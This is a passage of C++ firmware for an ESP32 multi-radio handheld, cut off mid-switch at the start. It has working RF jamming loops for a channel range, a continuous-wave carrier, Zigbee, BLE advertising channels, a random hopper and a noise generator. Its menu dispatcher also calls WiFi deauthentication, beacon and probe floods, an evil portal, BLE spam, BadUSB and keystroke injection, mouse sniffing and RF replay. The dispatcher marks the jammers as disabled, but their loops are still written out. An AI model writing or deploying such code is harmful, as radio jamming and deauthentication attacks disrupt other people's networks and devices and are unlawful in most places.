        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_CHANNEL_RANGE: {
      int lo = 10, hi = 70;
      displayInfo("Ch Range", "Lo:" + String(lo) + " Hi:" + String(hi), "SEL stop");
      initRadios();
      jamPrepareRadios();
      while (!selPressed()) {
        channelRangeJam(lo, hi);
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;
    }

    case STATE_CW_JAMMER: {
      int ch = 40;
      initRadios();
      displayInfo("CW Jammer", "Ch:" + String(ch), "UP/DN chg SEL stop");
      cwJammer(ch);
      while (!selPressed()) {
        if (upPressed()) { ch = (ch + 5) % 125; cwJammer(ch); }
        if (downPressed()) { ch = (ch + 120) % 125; cwJammer(ch); }
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;
    }

    case STATE_ZIGBEE_JAM:
      displayInfo("Zigbee Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("Zigbee v6", "802.15.4 ch11-26", "SEL to stop");
      while (!selPressed()) {
        zigbeeJam();
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_BLE_TARGET_JAM:
      displayInfo("BLE Targ.Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("BLE Targ v6", "Adv 37/38/39", "SEL to stop");
      while (!selPressed()) {
        // Sadece BLE advertising kanallarına odaklan
        if (radio1Active) { radio1.setChannel(2);  radio1.writeFast(jamBuf, 32); }
        if (radio2Active) { radio2.setChannel(26); radio2.writeFast(jamBuf, 32); }
        if (radio1Active) { radio1.setChannel(80); radio1.writeFast(jamBuf, 32); }
        if (radio2Active) { radio2.setChannel(2);  radio2.writeFast(jamBuf, 32); }
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_CUSTOM_HOPPER: {
      int lo = 0, hi = 125;
      displayInfo("Hopper", "Range 0-125", "SEL stop");
      initRadios();
      jamPrepareRadios();
      while (!selPressed()) {
        int r = random(lo, hi + 1);
        if (radio1Active) { radio1.setChannel(r); radio1.writeFast(jamBuf, 32); }
        if (radio2Active) { radio2.setChannel(random(lo, hi + 1)); radio2.writeFast(jamBuf, 32); }
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;
    }

    case STATE_NOISE_GEN:
      displayInfo("NoiseGen", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("Noise Gen v6", "Random chaos", "SEL to stop");
      while (!selPressed()) {
        noiseGen();
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;
      
// ============================================================
// STATE DISPATCHER
// ============================================================
void executeState(AppState st) {
  switch (st) {
    case STATE_BT_JAM:
    case STATE_DRONE_JAM:
    case STATE_WIFI_JAM:
    case STATE_MULTI_JAM:
    case STATE_SWEEP_JAM:
    case STATE_CHANNEL_RANGE:
    case STATE_CW_JAMMER:
    case STATE_ZIGBEE_JAM:
    case STATE_BLE_TARGET_JAM:
    case STATE_CUSTOM_HOPPER:
    case STATE_NOISE_GEN:
      displayInfo("Jammer Module", "Disabled / Removed", "SEL to return");
      safeDelay(1200);
      currentState = STATE_MENU;
      break;

    case STATE_SPECTRUM_WIFI: runWiFiSpectrum(); break;
    case STATE_SPECTRUM_BLE:  runBLESpectrum();  break;
    case STATE_RF_ANALYZER:   runRFAnalyzer();   break;
    case STATE_WIFI_ANALYZER: runWiFiAnalyzer(); break;
    case STATE_PACKET_COUNTER:runPacketCounter();break;
    case STATE_WIFI_SNIFFER:  runWiFiSniffer();  break;
    case STATE_SIGNAL_METER:  runSignalMeter();  break;

    case STATE_BLE_SPAM:        runBLESpam();       break;
    case STATE_APPLE_JUICE:     runAppleJuice();    break;
    case STATE_SWIFT_PAIR:      runSwiftPair();     break;
    case STATE_FAST_PAIR:       runFastPair();      break;
    case STATE_RICKROLL_BEACON: runRickroll();      break;
    case STATE_BLE_BADUSB:      runBLEBadUSB();     break;
    case STATE_WIFI_DEAUTH: {
      int opt = 0;
      while (!selPressed()) {
        display.clearDisplay();
        drawHeader("Deauth Options");
        display.setCursor(0, 16); display.println(opt == 0 ? "> Single AP" : "  Single AP");
        display.setCursor(0, 28); display.println(opt == 1 ? "> All APs"   : "  All APs");
        display.display();
        if (upPressed() || downPressed()) opt = (opt == 0) ? 1 : 0;
        yield();
      }
      if (opt == 0) runWiFiDeauth(); else runWiFiDeauthAll();
      break;
    }
    case STATE_WIFI_BEACON_FLOOD: runWiFiBeaconFlood(); break;
    case STATE_PROBE_FLOOD:       runProbeFlood();      break;
    case STATE_EVIL_PORTAL:       runEvilPortal();      break;

    case STATE_ROGUE_AP_DETECT:  runRogueAPDetect();  break;
    case STATE_NRF24_INJECTOR:   runNRF24Injector();  break;
    case STATE_DEAUTH_DETECT:    runDeauthDetect();   break;
    case STATE_WIDS:             runWIDS();           break;
    case STATE_BLE_SCANNER:      runBLEScanner();     break;
    case STATE_BLE_GATT_EXPLORER:runBLEGATTExplorer();break;
    case STATE_BLE_TRACKER:      runBLETracker();     break;
    case STATE_MOUSE_SNIFFER:    runMouseSniffer();   break;
    case STATE_RF_REPEATER:      runRFRepeater();     break;
    case STATE_RF_REPLAY:        runRFReplay();       break;
    case STATE_RF_OSCILLOSCOPE:  runRFOscilloscope(); break;
    case STATE_DUCKY_INJECTOR:   runDuckyInjector();  break;
    case STATE_TEST_RADIOS:      runTestRadios();     break;
    case STATE_SYSTEM_INFO:      runSystemInfo();     break;

    case STATE_DOOM_GAME:    runDOOM();       break;
    case STATE_DINO_GAME:    runDinoGame();   break;
    case STATE_FLAPPY_GAME:  runFlappyGame(); break;
    case STATE_SNAKE_GAME:   runSnakeGame();  break;
    case STATE_TICTACTOE:    runTicTacToe();  break;
    case STATE_PONG:         runPong();       break;
    case STATE_HUNT_GAME:    runHuntGame();   break;
    case STATE_SIMON_GAME:   runSimonGame();  break;
    case STATE_MEMORY_GAME:  runMemoryGame(); break;
    case STATE_INVADERS:     runInvaders();   break;

    case STATE_CALCULATOR:    runCalculator();  break;
    case STATE_RESISTOR_CALC: runResistorCalc();break;
    case STATE_WIFI_MONITOR:  runWiFiMonitor(); break;
    case STATE_WEB_DASHBOARD: runWebDashboard();break;
    case STATE_CLI:           runCLI();         break;
    case STATE_SETTINGS:      showSettings();   break;
    case STATE_HELP:          showHelp();       break;
    case STATE_LOCK:          runLock();        break;
    case STATE_MENU: break;
    default: break;
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ============================================================
// SETUP & LOOP
// ============================================================
void setup() {
  Serial.begin(115200);
  safeDelay(600);
  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Wire.begin(SDA_PIN, SCL_PIN);
  if (!display.begin(SSD1306_SWITCHCAPVCC, SSD1306_I2C_ADDRESS)) {
    for (;;) yield();
  }
  display.dim(false);
  u8g2_for_adafruit_gfx.begin(display);

  prefs.begin("utsjam", false);
  brightness = prefs.getUChar("bright", 255);
  if (brightness < 10) brightness = 255;
  setBrightness(brightness);

  splashScreen();
  safeDelay(2200);
  drawMainMenu();
}

void loop() {
  switch (currentState) {
    case STATE_MENU: handleMainMenu(); break;
    case STATE_SUBMENU_JAMMERS:
    case STATE_SUBMENU_ANALYZERS:
    case STATE_SUBMENU_ATTACKS:
    case STATE_SUBMENU_TOOLS:
    case STATE_SUBMENU_GAMES:
    case STATE_SUBMENU_SETTINGS:
      handleSubMenu(); break;
    default:
      currentState = STATE_MENU;
      drawMainMenu();
      break;
  }
  yield();
}
